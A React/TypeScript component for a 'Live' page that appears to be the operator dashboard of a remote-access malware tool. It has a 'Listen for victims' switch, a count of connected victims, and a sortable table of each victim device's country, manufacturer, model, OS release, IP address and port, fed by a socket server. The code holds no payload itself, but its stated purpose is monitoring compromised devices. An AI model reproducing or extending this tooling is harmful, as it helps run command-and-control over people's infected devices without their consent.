import './Live.scss';

import {
    createTableColumn,
    DataGrid,
    DataGridBody,
    DataGridCell,
    DataGridHeader,
    DataGridHeaderCell,
    DataGridRow,
    InfoLabel,
    Switch,
    type TableColumnDefinition,
} from '@fluentui/react-components';
import { faEye } from '@fortawesome/free-regular-svg-icons';
import { faTowerBroadcast } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { observer } from 'mobx-react-lite';
import React, { useEffect } from 'react';

import { CustomToolbar, LoadingOverlay } from '../../../components';
import { useStore } from '../../../store';
import { type VictimDeviceStore } from '../../../store/VictimDeviceStore';
import {
    ConnectionStatusColorMap,
    ConnectionStatusTextMap,
} from '../../../utils/Mappings';

const columns: Array<TableColumnDefinition<VictimDeviceStore>> = [
    createTableColumn({
        columnId: 'country',
        compare: (a, b) => a.country.localeCompare(b.country),
        renderHeaderCell: () => 'Country',
        renderCell: (item) => item.country,
    }),
    createTableColumn({
        columnId: 'manufacturer',
        compare: (a, b) => a.manf.localeCompare(b.manf),
        renderHeaderCell: () => 'Manufacturer',
        renderCell: (item) => item.manf,
    }),
    createTableColumn({
        columnId: 'model',
        compare: (a, b) => a.model.localeCompare(b.model),
        renderHeaderCell: () => 'Model',
        renderCell: (item) => item.model,
    }),
    createTableColumn({
        columnId: 'release',
        compare: (a, b) => a.release.localeCompare(b.release),
        renderHeaderCell: () => 'Release',
        renderCell: (item) => item.release,
    }),
    createTableColumn({
        columnId: 'ip',
        compare: (a, b) => a.ip.localeCompare(b.ip),
        renderHeaderCell: () => 'IP',
        renderCell: (item) => item.ip,
    }),
    createTableColumn({
        columnId: 'port',
        compare: (a, b) => a.port - b.port,
        renderHeaderCell: () => 'Port',
        renderCell: (item) => item.port,
    }),
];

export const Live: React.FC = observer(() => {
    const { socketStore } = useStore();

    useEffect(() => {
        socketStore.connect();

        return () => {
            socketStore.disconnect();
        };
    }, [socketStore]);

    return (
        <div className='page-container live'>
            <CustomToolbar>
                <Switch
                    label='Listen for victims'
                    labelPosition='before'
                    disabled={socketStore.inprogress}
                    checked={socketStore.listening}
                    onChange={(_, data) => {
                        if (data.checked) {
                            socketStore.startListening();
                        } else {
                            socketStore.stopListening();
                        }
                    }}
                />
                <div className='fill'></div>
                <FontAwesomeIcon icon={faEye} />
                <InfoLabel
                    info='This indicates the number of victims that are currently connected to the server.'
                    className='victims-count'
                >
                    Connected Victims: {socketStore.victims.length}
                </InfoLabel>

                <FontAwesomeIcon
                    icon={faTowerBroadcast}
                    color={
                        ConnectionStatusColorMap[socketStore.connectionStatus]
                    }
                />
                <InfoLabel
                    info={
                        'This indicates the status of connection between this window and the server. This is not related to the connection of the victims.'
                    }
                >
                    Live Connection:{' '}
                    {ConnectionStatusTextMap[socketStore.connectionStatus]}
                </InfoLabel>
            </CustomToolbar>
            <div className='table-container'>
                <div className='scroll-container'>
                    <DataGrid
                        items={socketStore.victims}
                        columns={columns}
                        sortable
                        getRowId={(row) => row.id}
                    >
                        <DataGridHeader>
                            <DataGridRow>
                                {({ renderHeaderCell }) => (
                                    <DataGridHeaderCell>
                                        {renderHeaderCell()}
                                    </DataGridHeaderCell>
                                )}
                            </DataGridRow>
                        </DataGridHeader>
                        <DataGridBody<VictimDeviceStore>>
                            {({ item, rowId }) => (
                                <DataGridRow<VictimDeviceStore> key={rowId}>
                                    {({ renderCell }) => (
                                        <DataGridCell>
                                            {renderCell(item)}
                                        </DataGridCell>
                                    )}
                                </DataGridRow>
                            )}
                        </DataGridBody>
                    </DataGrid>
                </div>
                <LoadingOverlay
                    loading={socketStore.loading || socketStore.inprogress}
                />
            </div>
        </div>
    );
});
